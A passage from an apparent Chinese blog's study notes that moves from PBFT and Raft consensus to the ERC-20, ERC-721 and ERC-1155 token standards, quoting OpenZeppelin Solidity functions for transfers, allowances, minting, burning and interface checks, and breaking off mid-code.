个节点的相同消息后，代表共识已经正确完成。</p><p><strong>prepare和commit阶段为何都要2f+1个节点反馈确认?（这2f+1并不一定是相同的）</strong></p><p>某副本收到f+1个相同的反馈确认，如果这f+1个反馈中包含faulty节点发过来的消息，是不能作数的，因为faulty节点是墙头草，给副本i发送的消息和副本j发送的消息不一致(类⽐一下一个汉奸跟游击队说⾃己是爱国的，跟⻤子说⾃己是忠⼼的)。必须要2f+1个相同的反馈确认才能保证f+1个non-faulty节点正常，这时候即便f个faulty节点给不同⼈发不同消息也没关系，f+1个non-faulty节点已经形成了统一战线，他们在⼈数上已经多于那些墙头草了，可以达成⼀致了。</p><p>因此，如果顺利的话，一个节点收到1个pre-prepare消息和2f个和prepare消息进入commit阶段，2f+1个commit消息后可以reply给client，client收到f+1个回复就可以确认提交成功。</p><p><strong>client为何只需要f+1个相同的回复就可确认？</strong></p><p>之前我们说，prepare和commit阶段为何都要2f+1个节点反馈，才能确认。client只需要f+1个相同的reply就可以了呢？我们还是来考虑最坏的情况，我们假设这f+1个相同的reply中，有f个都是恶意节点。</p><p>所以至少有一个rely是正常节点发出来的，因为在prepare阶段，这个正常的节点已经可以保证prepared(m,v,n,i)为真，所以已经能代表大多数的意见，所以，client只需要f+1个相同的reply就能保证他拿到的是整个系统内“大多数正常节点“的意见，从而达到一致性。</p><h3 id="优缺点-3"><a href="#优缺点-3" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点：</strong></p><p>1）适用于permissioned systems (联盟链/私有链)，能容纳故障节点，也能容纳作恶节点。要求所有节点数量至少为3f+1（f为作恶/故障不回应节点的数量），这样才能保证在异步系统中提供安全性和活性。</p><p>2）解决了原始拜占庭容错(BFT)算法效率不高的问题，将算法复杂度由指数级降低到多项式级，使得拜占庭容错算法在实际系统应用中变得可行。</p><p><strong>缺点：</strong></p><p>1）仅仅适用于permissioned systems (联盟链/私有链)。</p><p>2）通信复杂度过高，可拓展性比较低，一般的系统在达到100左右的节点个数时，性能下降非常快。</p><p>3）PBFT在网络不稳定的情况下延迟很高。</p><h2 id="RAFT"><a href="#RAFT" class="headerlink" title="RAFT"></a>RAFT</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p><a href="https://zhuanlan.zhihu.com/p/125573685">参考</a></p><p>Raft协议是一种分布式一致性协议。一个节点有3种状态：</p><ol><li>Follower state.</li><li>Candidate state.</li><li>Leader state.</li></ol><p><img src="/2022/08/06/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220806204455621.png" alt="image-20220806204455621"></p><p> Raft要求系统在任意时刻最多只有一个Leader，正常工作期间只有Leader和Followers。Raft算法将时间分为一个个的任期（term），每一个term的开始都是Leader选举。在成功选举Leader之后，Leader会在整个term内管理整个集群。如果Leader选举失败，该term就会因为没有Leader而结束。</p><p>每个节点上都有一个倒计时器 (Election Timeout)，时间随机在 150ms 到 300ms 之间。有几种情况会重设 Timeout： </p><p>（1）收到选举的请求 </p><p>（2）收到 Leader 的 Heartbeat </p><p>在 Raft 运行过程中，最主要进行两个活动： </p><p>（1）选主 Leader Election </p><p>（2）复制日志 Log Replication：leader接受来自客户端的命令，记录为日志，并复制给集群中的其他服务器，并强制其他节点的日志与leader保持一致</p><h3 id="优缺点-4"><a href="#优缺点-4" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点：</strong></p><p>模型比Paxos更简单，但提供了同等的安全性。有多种语言的实现可用。</p><p><strong>缺点：</strong></p><p>1）通常用于私有网络和许可网络</p><p>2）顺序投票，只能串行apply，因此高并发场景下性能差。</p>]]></content>
    
    
    
    <tags>
      
      <tag>共识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ERC20、ERC721、ERC1155标准规范</title>
    <link href="/2022/07/20/ERC20%E3%80%81ERC721%E3%80%81ERC1155%E6%A0%87%E5%87%86%E8%A7%84%E8%8C%83/"/>
    <url>/2022/07/20/ERC20%E3%80%81ERC721%E3%80%81ERC1155%E6%A0%87%E5%87%86%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<p>ERC是由Etherum开发人员为以太坊社区编写的。为了创建一个以太坊平台的标准，开发人员应当提交了一个以太坊改进方案（EIP，Ethereum Improvement Protocol），改进方案中包括协议规范和合约标准。一旦EIP被委员会批准并最终确定，它就成为ERC。</p><p>由于这些标准，智能合同和令牌交互更加容易，因此开发人员可以在以太坊子上创建 dapps。你会听到一个常见的类比来解释这个好处: 以太坊类似于IOS和Android的dapps——一个支持应用程序并使其易于构建的操作系统。</p><p>目前，最常见的以太网标记标准是ERC-20和ERC-721。</p><table><thead><tr><th align="left">标准</th><th align="left">ERC-20</th><th align="left">ERC-721</th><th align="left">ERC-1155</th></tr></thead><tbody><tr><td align="left">代币类型</td><td align="left">同质化代币</td><td align="left">非同质化代币</td><td align="left">同质化代币、非同质化代币、介于同质化和非同质化代币之间可以互相切换的代币</td></tr><tr><td align="left">特点</td><td align="left">代币属性相同、可无损互换、可拆分</td><td align="left">代币属性互不相同、不可互换、不可拆分</td><td align="left">前两者的特点都有，且在一定程度上可以在两者中切换</td></tr><tr><td align="left">生成处理</td><td align="left">一次性只能生成一种 ERC-20 代币，一次性只能进行单笔单对象交易，并且交易处理需要多次批准</td><td align="left">一次性只能生成一种 ERC-721 代币，一次性只能进行单笔单对象交易，并且交易处理需要多次批准</td><td align="left">一次性可以生成多种 ERC-1155 代币资产类别，一次性可以进行多笔多对象交易，交易处理只需要一次批准</td></tr></tbody></table><h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><p><a href="https://docs.openzeppelin.com/contracts/4.x/erc20">ERC20官方文档</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC20">ERC20合约代码</a></p><p>ERC-20是最广为人知的标准。</p><p>ERC-20标准规定令牌必须有其名称、符号、总供应量和其他功能，包括转账和汇款。这个标准的优点是，只要令牌符合 erc-20标准，它将与以太钱包兼容。也就是说，你可以把代币加到你的以太坊钱包里，然后通过你的钱包发送给别人。</p><p>ERC20 的功能包括但不限于以下几点：</p><ul><li>转账：将代币从一个帐户转到另一个帐户</li><li>查询余额：获取帐户的当前代币余额</li><li>查询总量：获取网络上可用代币的总供应量</li><li>代币授权：批准一个帐户中一定的代币金额由第三方帐户使用</li></ul><p><img src="/2022/07/20/ERC20%E3%80%81ERC721%E3%80%81ERC1155%E6%A0%87%E5%87%86%E8%A7%84%E8%8C%83/image-20220710192753893.png" alt="image-20220710192753893"></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC-20</a>具体实现了以上<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol">IERC-20</a>接口</p><h2 id="基本变量"><a href="#基本变量" class="headerlink" title="基本变量"></a>基本变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 private _totalSupply;//发行总量<br>string private _name;//代币名称<br>string private _symbol;//代币标识符<br></code></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">constructor (string memory name_, string memory symbol_) &#123;<br>    _name = name_;//初始化代币名称<br>    _symbol = symbol_;//初始化代币标识符<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="查询函数"><a href="#查询函数" class="headerlink" title="查询函数"></a>查询函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br>    * @dev Returns the name of the token.<br>    */<br>   function name() public view virtual override returns (string memory) &#123;<br>       return _name;<br>   &#125;<br><br>   /**<br>    * @dev Returns the symbol of the token, usually a shorter version of the<br>    * name.<br>    */<br>   function symbol() public view virtual override returns (string memory) &#123;<br>       return _symbol;<br>   &#125;<br><br>   /**<br>    * @dev Returns the number of decimals used to get its user representation.<br>    * For example, if `decimals` equals `2`, a balance of `505` tokens should<br>    * be displayed to a user as `5,05` (`505 / 10 ** 2`).<br>    *<br>    * Tokens usually opt for a value of 18, imitating the relationship between<br>    * Ether and Wei. This is the value &#123;ERC20&#125; uses, unless this function is<br>    * overloaded;<br>    *<br>    * NOTE: This information is only used for _display_ purposes: it in<br>    * no way affects any of the arithmetic of the contract, including<br>    * &#123;IERC20-balanceOf&#125; and &#123;IERC20-transfer&#125;.<br>    */<br>   function decimals() public view virtual override returns (uint8) &#123;<br>       return 18;<br>   &#125;<br><br>   /**<br>    * @dev See &#123;IERC20-totalSupply&#125;.<br>    */<br>   function totalSupply() public view virtual override returns (uint256) &#123;<br>       return _totalSupply;<br>   &#125;<br><br>   /**<br>    * @dev See &#123;IERC20-balanceOf&#125;.<br>    */<br>   function balanceOf(address account) public view virtual override returns (uint256) &#123;<br>       return _balances[account];<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="转账逻辑"><a href="#转账逻辑" class="headerlink" title="转账逻辑"></a>转账逻辑</h2><p>转账是ERC20的关键所在</p><p>ERC20中有两个函数可以用来转账</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br>    * @dev See &#123;IERC20-transfer&#125;.<br>    *<br>    * Requirements:<br>    *<br>    * - `recipient` cannot be the zero address.<br>    * - the caller must have a balance of at least `amount`.<br>    */<br>   function transfer(address recipient, uint256 amount) public virtual override returns (bool) &#123;<br>       _transfer(_msgSender(), recipient, amount);<br>       return true;<br>   &#125;<br>   <br>   /**<br>    * @dev See &#123;IERC20-transferFrom&#125;.<br>    *<br>    * Emits an &#123;Approval&#125; event indicating the updated allowance. This is not<br>    * required by the EIP. See the note at the beginning of &#123;ERC20&#125;.<br>    *<br>    * Requirements:<br>    *<br>    * - `sender` and `recipient` cannot be the zero address.<br>    * - `sender` must have a balance of at least `amount`.<br>    * - the caller must have allowance for ``sender``&#x27;s tokens of at least<br>    * `amount`.<br>    */<br>   function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123;<br>       _transfer(sender, recipient, amount);<br><br>       uint256 currentAllowance = _allowances[sender][_msgSender()];<br>       require(currentAllowance &gt;= amount, &quot;ERC20: transfer amount exceeds allowance&quot;);<br>       _approve(sender, _msgSender(), currentAllowance - amount);<br><br>       return true;<br>   &#125;<br></code></pre></td></tr></table></figure><p>其中都调用了 <code>_transfer</code> 来实现转账逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br>    * @dev Moves tokens `amount` from `sender` to `recipient`.<br>    *<br>    * This is internal function is equivalent to &#123;transfer&#125;, and can be used to<br>    * e.g. implement automatic token fees, slashing mechanisms, etc.<br>    *<br>    * Emits a &#123;Transfer&#125; event.<br>    *<br>    * Requirements:<br>    *<br>    * - `sender` cannot be the zero address.<br>    * - `recipient` cannot be the zero address.<br>    * - `sender` must have a balance of at least `amount`.<br>    */<br>   function _transfer(address sender, address recipient, uint256 amount) internal virtual &#123;<br>       require(sender != address(0), &quot;ERC20: transfer from the zero address&quot;);<br>       require(recipient != address(0), &quot;ERC20: transfer to the zero address&quot;);<br><br>       _beforeTokenTransfer(sender, recipient, amount);<br><br>       uint256 senderBalance = _balances[sender];<br>       require(senderBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);<br>       _balances[sender] = senderBalance - amount;<br>       _balances[recipient] += amount;<br><br>       emit Transfer(sender, recipient, amount);<br>   &#125;<br></code></pre></td></tr></table></figure><p>其中，<code>transferFrom</code> 方法用于提款流程，允许合约代表代币所有者账户转移代币。 即从A账户到B账户，再由B账户到C账户。例如，这可用于允许合约代表代币所有者转移代币和/或以次级货币（sub-currency）的形式收取费用。若函数调用者没有得到_from账户的授权，或授权转账的额度小于转账的额度，该函数则会抛出异常并回滚。</p><p>可以使用 <code>approve</code> 来设置授权转账的额度， 用 <code>allowance</code> 来查询已授权的转账额度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC20-allowance&#125;.<br> */<br>function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;<br>    return _allowances[owner][spender];<br>&#125;<br><br>/**<br> * @dev See &#123;IERC20-approve&#125;.<br> *<br> * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on<br> * `transferFrom`. This is semantically equivalent to an infinite approval.<br> *<br> * Requirements:<br> *<br> * - `spender` cannot be the zero address.<br> */<br>function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;<br>    address owner = _msgSender();<br>    _approve(owner, spender, amount);<br>    return true;<br>&#125;<br></code></pre></td></tr></table></figure><p>除此之外，还有两个用于增加和减少授权额度的函数—— <code>increaseAllowance</code> 、<code>decreaseAllowance</code> ，这两个函数主要用于在原有的授权基础之上再增加授权额度或者减少授权额度的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Atomically increases the allowance granted to `spender` by the caller.<br> *<br> * This is an alternative to &#123;approve&#125; that can be used as a mitigation for<br> * problems described in &#123;IERC20-approve&#125;.<br> *<br> * Emits an &#123;Approval&#125; event indicating the updated allowance.<br> *<br> * Requirements:<br> *<br> * - `spender` cannot be the zero address.<br> */<br>function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;<br>    address owner = _msgSender();<br>    _approve(owner, spender, allowance(owner, spender) + addedValue);<br>    return true;<br>&#125;<br><br>/**<br> * @dev Atomically decreases the allowance granted to `spender` by the caller.<br> *<br> * This is an alternative to &#123;approve&#125; that can be used as a mitigation for<br> * problems described in &#123;IERC20-approve&#125;.<br> *<br> * Emits an &#123;Approval&#125; event indicating the updated allowance.<br> *<br> * Requirements:<br> *<br> * - `spender` cannot be the zero address.<br> * - `spender` must have allowance for the caller of at least<br> * `subtractedValue`.<br> */<br>function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;<br>    address owner = _msgSender();<br>    uint256 currentAllowance = allowance(owner, spender);<br>    require(currentAllowance &gt;= subtractedValue, &quot;ERC20: decreased allowance below zero&quot;);<br>    unchecked &#123;<br>        _approve(owner, spender, currentAllowance - subtractedValue);<br>    &#125;<br><br>    return true;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="铸币操作"><a href="#铸币操作" class="headerlink" title="铸币操作"></a>铸币操作</h2><p>ERC-20中也提供了铸币函数，该函数主要用于增发代币操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/** @dev Creates `amount` tokens and assigns them to `account`, increasing<br> * the total supply.<br> *<br> * Emits a &#123;Transfer&#125; event with `from` set to the zero address.<br> *<br> * Requirements:<br> *<br> * - `account` cannot be the zero address.<br> */<br>function _mint(address account, uint256 amount) internal virtual &#123;<br>    require(account != address(0), &quot;ERC20: mint to the zero address&quot;);<br><br>    _beforeTokenTransfer(address(0), account, amount);<br><br>    _totalSupply += amount;<br>    unchecked &#123;<br>        // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.<br>        _balances[account] += amount;<br>    &#125;<br>    emit Transfer(address(0), account, amount);<br><br>    _afterTokenTransfer(address(0), account, amount);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="代币销毁"><a href="#代币销毁" class="headerlink" title="代币销毁"></a>代币销毁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Destroys `amount` tokens from `account`, reducing the<br> * total supply.<br> *<br> * Emits a &#123;Transfer&#125; event with `to` set to the zero address.<br> *<br> * Requirements:<br> *<br> * - `account` cannot be the zero address.<br> * - `account` must have at least `amount` tokens.<br> */<br>function _burn(address account, uint256 amount) internal virtual &#123;<br>    require(account != address(0), &quot;ERC20: bur n from the zero address&quot;);<br><br>    _beforeTokenTransfer(account, address(0), amount);<br><br>    uint256 accountBalance = _balances[account];<br>    require(accountBalance &gt;= amount, &quot;ERC20: burn amount exceeds balance&quot;);<br>    unchecked &#123;<br>        _balances[account] = accountBalance - amount;<br>        // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.<br>        _totalSupply -= amount;<br>    &#125;<br><br>    emit Transfer(account, address(0), amount);<br><br>    _afterTokenTransfer(account, address(0), amount);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h1><p><a href="https://docs.openzeppelin.com/contracts/4.x/erc721">ERC721官方文档</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC721">ERC721合约代码</a></p><p>ERC-721标准规定，每个符合其标准的令牌都有一个唯一的令牌标识。ERC721 代表<a href="https://docs.openzeppelin.com/contracts/4.x/tokens#different-kinds-of-tokens"><em>不可替代</em></a><a href="https://docs.openzeppelin.com/contracts/4.x/tokens#different-kinds-of-tokens">代币</a>所有权的标准。在ERC-721标准中，每个令牌都是唯一的。也就是说，在ERC-721标准下，你的100元和我的100元是不一样的，因为两个100元的数字是不一样的。</p><p>每一个NFT都有一个uint256类型的变量，名为tokenId，所以对于任何ERC721合约，这对值&lt;contract address, tokenId&gt;必须是全局唯一的。</p><p>ERC721的功能包括但不限于以下几点：</p><ul><li>转账：将代币从一个帐户转移到另一个帐户；</li><li>查询余额：获取帐户的当前代币余额；</li><li>查询所有者：获取代币的所有者；</li><li>查询总量：获取整个网络的可用代币总供应量；</li><li>代币授权：批准帐户中一定数量的代币可以被第三方帐户转移。</li></ul><p><img src="/2022/07/20/ERC20%E3%80%81ERC721%E3%80%81ERC1155%E6%A0%87%E5%87%86%E8%A7%84%E8%8C%83/image-20220710223711603.png" alt="image-20220710223711603"></p><p><img src="/2022/07/20/ERC20%E3%80%81ERC721%E3%80%81ERC1155%E6%A0%87%E5%87%86%E8%A7%84%E8%8C%83/image-20220710223726455.png" alt="image-20220710223726455"></p><h2 id="基本变量-1"><a href="#基本变量-1" class="headerlink" title="基本变量"></a>基本变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Token name<br>string private _name;<br><br>// Token symbol<br>string private _symbol;<br><br>// Mapping from token ID to owner address<br>mapping(uint256 =&gt; address) private _owners;<br><br>// Mapping owner address to token count<br>mapping(address =&gt; uint256) private _balances;<br><br>// Mapping from token ID to approved address<br>mapping(uint256 =&gt; address) private _tokenApprovals;<br><br>// Mapping from owner to operator approvals<br>mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;<br></code></pre></td></tr></table></figure><h2 id="构造函数-1"><a href="#构造函数-1" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Initializes the contract by setting a `name` and a `symbol` to the token collection.<br> */<br>constructor(string memory name_, string memory symbol_) &#123;<br>    _name = name_;<br>    _symbol = symbol_;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实现查询"><a href="#实现查询" class="headerlink" title="实现查询"></a>实现查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br>     * @dev See &#123;IERC165-supportsInterface&#125;.<br>     */<br>    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) &#123;<br>        return<br>            interfaceId == type(IERC721).interfaceId ||<br>            interfaceId == type(IERC721Metadata).interfaceId ||<br>            super.supportsInterface(interfaceId);<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以调用</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">IERC721(contractAddress)<span class="hljs-selector-class">.supportsInterface</span>(<span class="hljs-number">0</span>x80ac58cd)<br></code></pre></td></tr></table></figure><p>来检查是否符合ERC721标准</p><p>其中0x80ac58cd来源如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes4 private constant _InterfaceId_ERC721 = 0x80ac58cd;<br>/*<br>     *     bytes4(keccak256(&#x27;balanceOf(address)&#x27;)) == 0x70a08231<br>     *     bytes4(keccak256(&#x27;ownerOf(uint256)&#x27;)) == 0x6352211e<br>     *     bytes4(keccak256(&#x27;approve(address,uint256)&#x27;)) == 0x095ea7b3<br>     *     bytes4(keccak256(&#x27;getApproved(uint256)&#x27;)) == 0x081812fc<br>     *     bytes4(keccak256(&#x27;setApprovalForAll(address,bool)&#x27;)) == 0xa22cb465<br>     *     bytes4(keccak256(&#x27;isApprovedForAll(address,address)&#x27;)) == 0xe985e9c5<br>     *     bytes4(keccak256(&#x27;transferFrom(address,address,uint256)&#x27;)) == 0x23b872dd<br>     *     bytes4(keccak256(&#x27;safeTransferFrom(address,address,uint256)&#x27;)) == 0x42842e0e<br>     *     bytes4(keccak256(&#x27;safeTransferFrom(address,address,uint256,bytes)&#x27;)) == 0xb88d4fde<br>     *<br>     *     =&gt; 0x70a08231 ^ 0x6352211e ^ 0x095ea7b3 ^ 0x081812fc ^<br>     *        0xa22cb465 ^ 0xe985e9c ^ 0x23b872dd ^ 0x42842e0e ^ 0xb88d4fde == 0x80ac58cd<br>     */<br></code></pre></td></tr></table></figure><h2 id="基础查询"><a href="#基础查询" class="headerlink" title="基础查询"></a>基础查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC721-balanceOf&#125;.<br> */<br>function balanceOf(address owner) public view virtual override returns (uint256) &#123;<br>    require(owner != address(0), &quot;ERC721: address zero is not a valid owner&quot;);<br>    return _balances[owner];<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721-ownerOf&#125;.<br> */<br>function ownerOf(uint256 tokenId) public view virtual override returns (address) &#123;<br>    address owner = _owners[tokenId];<br>    require(owner != address(0), &quot;ERC721: invalid token ID&quot;);<br>    return owner;<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721Metadata-name&#125;.<br> */<br>function name() public view virtual override returns (string memory) &#123;<br>    return _name;<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721Metadata-symbol&#125;.<br> */<br>function symbol() public view virtual override returns (string memory) &#123;<br>    return _symbol;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="数据查找"><a href="#数据查找" class="headerlink" title="数据查找"></a><strong>数据查找</strong></h2><p>URI的原意为”统一资源定位符”，而在ERC-721合约中的tokenURI正是通过tokenId来检索对应的token，具体实现代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 